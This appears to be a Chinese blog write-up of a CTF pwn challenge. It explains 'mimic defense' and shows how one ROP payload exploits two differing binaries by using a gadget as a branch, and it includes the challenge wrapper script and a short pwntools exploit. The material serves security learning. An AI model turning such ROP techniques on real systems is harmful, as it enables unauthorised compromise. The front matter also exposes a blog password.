---
title: 浅尝拟态防御
tags:
  - 拟态防御
  - lab
categories: 私房菜
password: he13716649461
abbrlink: d12f5bed
---

### 什么是拟态防御?

> 拟态防御机制简单来说就是动态冗余结构。
>
> 动态防御➕异构冗余结构
>
> 1.动态防御
>
> 是指在面对外来攻击的时候，系统或服务器平台不断变化自己的属性，这样黑客在攻击服务器时很难找到固定的漏洞。
>
> 如此一来，大大增加了黑客的攻击成本、消耗时间。
>
> 2.异构冗余结构
>
> 现在的异构冗余结构中最常用的就是N-变体结构。
>
> 简单来说，就是备份一个系统，这样攻击就不会导致系统瘫痪，使得平台能够“带菌生存”。
>
> 当然这些备份都是异构体，结构互不相同，但是实现的功能一致。
>
> 这样，面对有威胁的数据，不同的系统漏洞不同，就会产生不同结果。经过表决器可以判断是哪个系统出了问题。
>
> 将以上两者结合就是拟态防御结构啦。
>
> 作者：vanvan
>链接：https://www.zhihu.com/question/276998785/answer/1034454703
> 来源：知乎

而在pwn题中的拟态防御通常体现为有一个程序分别同时执行了两个附件(可能是一个32位一个是64位，代码逻辑一样。又或者位数相同，但是代码有细微的差别导致了gadget地址几乎都不一样)，我们打过去的payload必须要让两个附件产生相同的输出才可以通过检查，接下来通过一道pwn题来体会其攻击思想。

### README

> One exploit works for two binary. Your goal is to exploit two binary
> at once and print out the following strings
>
> 
>
> "READ_THIS_FIRST"          from target1
>
> "YOU_SHOULD_READ_THIS_TOO" from target2

这道题需要脚本同时对target1 target2发送数据，而让他们打印不同的字符串即可获取flag。

挂起两个附件的py脚本如下:

```py
#!/usr/bin/python2
import os
import subprocess as sp
import signal

SIZE = 0x1000
ROOT = '/home/zikh/Desktop/2kills/'

def execute_process(target):
    target = os.path.join(ROOT, target)
    p = sp.Popen(target, stdin = sp.PIPE, \
                                stdout = sp.PIPE)
    p.stdout.readline() # Get...
    p.stdin.write(payload)
    p.stdout.readline() # Input...
    out = p.stdout.readline().strip()
    return out

if __name__ == '__main__':
    print "Kill two binaries with one ROP"
    print "(neeed to read 'MSG' in target)"
    signal.alarm(5)
    payload = os.read(0, SIZE)

    out1 = execute_process(ROOT + 'target1')
    out2 = execute_process(ROOT + 'target2')
    

    if (out1 == "READ_THIS_FIRST" \
        and out2 == "YOU_SHOULD_READ_THIS_TOO"):
        print "Wow...!\nThis is your flag...\n"
        os.system("cat /flag")
    else:
        print "Failed..."
```



### 保护策略

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211221237330.png" alt="image-20221122123720079" style="zoom:50%;" />

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211221237079.png" alt="image-20221122123746569" style="zoom:50%;" />

可以观察到上图开了沙箱，是个白名单。但是对于打印字符串这个要求的话是够了，不这样设置的话可能是怕我们整出其他花活来操作。

### 程序分析

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211221242646.png" alt="image-20221122124257597" style="zoom:50%;" />

![image-20221122124420126](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211221244161.png)

上图是target1的代码，target2的和这个逻辑一样，就不再分析了。

程序给了大量的字节输入(target2里面的输入只有48个字节)，最后有个start_rop函数，这个会直接去执行我们刚输入的地址里的指令。

注意，两个程序里同一地址对应的gadget是不一样的(如下)

![image-20221122125353521](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211221253562.png)

![image-20221122125432275](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211221254323.png)



### 利用思路

这种拟态防御的题目核心是不同程序的gadget地址不一样，如果我们用脚本打通了第一个程序，但是去打第二个程序的时候就会因为gadget地址不一样而导致程序崩溃。因此我们需要找一个gadget，在一个程序里没什么用(比如ret)，但是在另一个程序中却可以对栈顶指针进行一些操作(比如add esp)

这样我们可以把这个关键的gadget当做payload里的一个分支条件，如果触发了add esp就会执行payload的后半部分，而当做ret来执行的话就会去执行payload的前半部分，这样在payload的前后部分分别写下攻击不同target的rop链即可。

**总结:需要在exp里利用一个关键gadget做一个条件分支去执行不同的payload攻击两个target文件**



通过Ropgadget和ida的搜索，找到了这样一个gadget

下图是针对target2而言

![image-20221122130910686](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211221309787.png)

而在target1的这个位置代码如下:

![image-20221122131017762](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211221310808.png)

target1这段代码整体来说对攻击来说是无伤大雅的，可以看作没有影响(仅仅是有一个pop ebp，在脚本里垫一个垃圾数据即可)

因此我们在exp里第一个gadget就写这个0x0805285e，如果打的是target1，那么就相当于只执行了一个pop ebp，而后就继续执行紧跟在后面的payload了，如果打的是target2，那么就相当于执行了add esp, 0x10 ; pop ebx ; pop ebp ; ret，这相当于直接把esp增加了0x18。因此我们在payload前0x18个字节布置关于target1的rop，0x18之后的payload布置关于target2即可。



### EXP

```py
from tools import *
context.log_level='debug'
p=process(["python","server.py"])
gadget=0x0805285E
strings_1=0x080b84e8
write_addr_1=0x080793f0

strings_2=0x080b8388
write_addr_2=0x08078600

payload=p32(gadget)+p32(0xdeadbeef)+p32(write_addr_1)+p32(0xdeadbeef)+p32(1)+p32(strings_1)+p32(15)
payload+=p32(write_addr_2)+p32(0xdeadbeef)+p32(1)+p32(strings_2)+p32(24)
p.sendline(payload)
p.interactive()
```

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211221318634.png" alt="image-20221122131847126" style="zoom:50%;" />

### 题目附件

链接: https://pan.baidu.com/s/1YaG8fj4KESjGMVD_28QjxQ?pwd=qcqk 提取码: qcqk 

